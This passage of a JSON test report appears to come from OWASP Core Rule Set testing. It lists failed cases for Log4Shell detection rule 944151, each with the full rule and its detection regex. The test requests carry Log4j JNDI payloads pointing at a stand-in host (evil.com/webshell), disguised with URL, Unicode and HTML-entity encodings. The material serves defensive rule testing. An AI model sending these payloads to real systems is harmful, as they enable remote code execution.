          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 13,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion, upper case",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 13,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion, upper case",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$&LBRACE;jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 14,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with numeric HTML entity evasion",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 14,
      "desc" : "Log4J exploit on JSON with numeric HTML entity evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"&#36;{jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 15,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with Unicode escape evasion, wrapped in URL encoding evasion",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 15,
      "desc" : "Log4J exploit on JSON with Unicode escape evasion, wrapped in URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24%5Cu007Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 16,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with URL encoding evasion, wrapped in Unicode escape evasion",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 16,
      "desc" : "Log4J exploit on JSON with URL encoding evasion, wrapped in Unicode escape evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"\\u002524%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 17,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with URL encoding evasion, mixed with Unicode escape evasion",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 17,
      "desc" : "Log4J exploit on JSON with URL encoding evasion, mixed with Unicode escape evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24\\u007Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 18,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion wrapped in URL encoding evasion",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 18,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion wrapped in URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24%26lbrace%3Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
